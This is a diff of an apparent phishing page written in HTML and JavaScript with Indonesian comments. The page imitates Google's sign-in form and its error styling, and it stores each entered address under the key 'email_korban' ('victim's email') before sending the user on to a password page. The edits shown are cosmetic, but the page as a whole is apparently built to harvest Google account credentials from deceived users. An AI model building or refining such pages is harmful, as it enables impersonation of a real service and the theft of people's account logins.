@@ -15,7 +15,6 @@
     
     .input-group { margin-bottom: 16px; position: relative; }
     
-    /* STYLE ERROR GOOGLE ASLI */
     .error-msg {
         display: none;
         color: #f28b82;
@@ -62,10 +61,9 @@
     <div class="input-group">
         <input type="email" id="emailInput" class="input-field" placeholder="Email atau nomor telepon">
         
-        <!-- NOTIFIKASI ERROR -->
         <div class="error-msg" id="emailError">
             <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
-            <span id="emailErrorText">Harus diakhiri dengan @gmail.com</span>
+            <span id="emailErrorText">Email harus diakhiri dengan @gmail.com</span>
         </div>
     </div>
 
@@ -103,7 +101,7 @@
             return;
         }
 
-        // Simpan email ke sessionStorage
+        // === SIMPEN EMAIL KE SESSION STORAGE ===
         sessionStorage.setItem('email_korban', email);
         
         // Lanjut ke halaman password
